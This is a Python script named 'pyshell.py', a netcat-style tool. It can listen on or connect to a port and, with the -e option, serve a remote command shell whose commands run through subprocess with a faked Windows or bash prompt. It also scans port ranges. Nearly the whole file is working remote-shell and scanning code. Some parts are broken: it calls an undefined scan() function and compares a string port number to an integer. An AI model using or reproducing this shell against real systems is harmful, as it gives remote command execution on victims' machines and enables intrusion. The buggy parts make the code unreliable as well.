#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess
import os

listen = False
execute = ''
target = ""
port = 0
zero = False
ver = False

if sys.platform == 'win32':
    clrf = b'\n'
else:
    clrf = b''


def usage():

    print("""Connect: pyshell.py -t hostname -p port[s] [-options]
Listen: pyshell.py -l -p port [-options]""")

    print("-h                  Display this help message")
    print("-l                  Listen on [host]:[port] for incoming connections")
    print("-p port[s]          Port for the connections")
    print("-e file             Execute file upon connection")
    print("-t add              Host for the ibound connection")
    print("-z                  Zero I/O mode (used in port scaning)")
    print("-v                  Verbose mode")

    sys.exit(0)


def exec_command(command, exe):
    command = command.rstrip()

    try:
        if exe == 'cmd' or 'cmd.exe' in exe or exe == '/bin/bash':
            out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)+clrf
        else:
            out = subprocess.check_output([exe, command], stderr=subprocess.STDOUT, shell=True)+clrf

    except subprocess.CalledProcessError:
        if sys.platform == 'win32':
            out = b"'%s' is not recognized as an internal or external command,\noperable program or batch file.\n\n" % command.encode()
        else:
            out = b"-bash: %s: command not found\n" % command.encode()
            
    return out


def client_handler(client_socket, execute):
    if len(execute):
        if sys.platform == 'win32':
            ver = subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True) + b'(c) Microsoft Corporation. All rights reserved.\n\n'
            client_socket.send(ver + os.getcwd().encode() + b'>')
        else:
            loc = os.getcwd().split('/')
            if loc[1] == 'root':
                usr = 'root'
            else:
                usr = loc[2]
                client_socket.send(('%s@%s:%s# ' % (usr, socket.gethostname(), os.getcwd())).encode())

        while 1:
            try:
                cmd_buffer = client_socket.recv(1024)

                _str = cmd_buffer.decode()
                if not len(_str):
                    out = b'\n'

                elif _str[:4] == 'exit':
                    client_socket.close()
                    break

                else:
                    if _str == 'cd..' and sys.platform == 'win32':
                        oloc = ''
                        aloc = os.getcwd().split('\\')
                        i = 0
                        while i < len(aloc)-1:
                            oloc += aloc[i]+'/'
                            i += 1
                        os.chdir(oloc)
                        out = b'\n'
                    elif _str == 'cd/' and sys.platform == 'win32':
                        oloc = os.getcwd().split('\\')[0]+'/'
                        os.chdir(oloc)
                        out = b'\n'
                        
                    elif _str[:2] == 'cd' and len(_str.replace(' ', '')) != 2:
                        try:
                            os.chdir(_str[3:])
                            out = clrf
                        except:
                            if sys.platform == 'win32':
                                out = b'The system cannot find the path specified.\n\n'
                            else:
                                out = b"-bash: cd: %s: No such file or directory\n" % _str[3:].encode()
                    elif _str[:2] == 'cd' and sys.platform != 'win32':
                        oloc = ''
                        aloc = os.getcwd().split('/')
                        i = 0
                        while i < 3:
                            oloc += aloc[i]+'/'
                            i += 1
                        os.chdir(oloc)
                        out = b''
                    else:
                        out = exec_command(_str, execute)

                if sys.platform == 'win32':
                    client_socket.sendall(out + os.getcwd().encode() + b'>')

                else:
                    loc = os.getcwd().split('/')
                    if loc[1] == 'root':
                        usr = 'root'
                    else:
                        usr = loc[2]
                    client_socket.sendall(out + ('%s@%s:%s# ' % (usr, socket.gethostname(), os.getcwd())).encode())

            except:
                client_socket.close()
                break


    else:
        while 1:
            try:
                data = client_socket.recv(4096).decode()

                buffer = input(data)
                if not len(buffer):
                    buffer = '\n'
                elif buffer[:4] == 'exit':
                    client_socket.send(b'exit')
                    client_socket.close()
                    break
                client_socket.send(buffer.encode())

            except:
                client_socket.close()
                break

    quit()


def client_send(target, port, exe):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))

        print('(UNKNOWN) [%s] %s : connection successfully' % (target, port))

        if zero == True:
            client.close()
            
        else:
            try:
                client_thread = threading.Thread(target=client_handler, args=(client, exe))
                client_thread.start()
            except KeyboardInterrupt:
                print('^C')
                quit()

    except:
        if ver == True:
            print('(UNKNOWN) [%s] %s : connection failed' % (target, port))
        else:
            pass

def server_loop(port, exe):
    target = "0.0.0.0"

    if ver == True:
        print('Listening on %s ...' % port)
    else:
        pass

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    try:
        client_socket, addr = server.accept()

        print('(UNKNOWN) [%s] %s : connection successfully' % (addr[0], addr[1]))

        try:
            client_thread = threading.Thread(target=client_handler, args=(client_socket, exe))
            client_thread.start()

        except KeyboardInterrupt:
            print('^C')
            quit()

    except:
        pass


def main():
    global listen
    global port
    global execute
    global target
    global zero
    global ver

    if not len(sys.argv[1:]):
        scan()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:zv", ["help", "listen", "execute",
                                                        "target", "port", "zero", "verbose"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h"):
            usage()
        elif o in ("-l"):
            listen = True
        elif o in ("-e"):
            execute = a
        elif o in ("-t"):
            target = a
        elif o in ("-p"):
            port = a
        elif o in ("-z"):
            zero = True
        elif o in ("-v"):
            ver = True
        else:
            pass

    if not listen and len(target) and '-' in port:
        fport = int(port.split('-')[0])
        lport = int(port.split('-')[1])
        for p in range(fport, lport+1):
            _thread = threading.Thread(target=client_send, args=(target, p, execute))
            _thread.start()
            
    elif not listen and len(target) and port > 0:
        client_send(target, int(port), execute)

    elif listen:
        server_loop(int(port), execute)

    else:
        usage()
 

main()
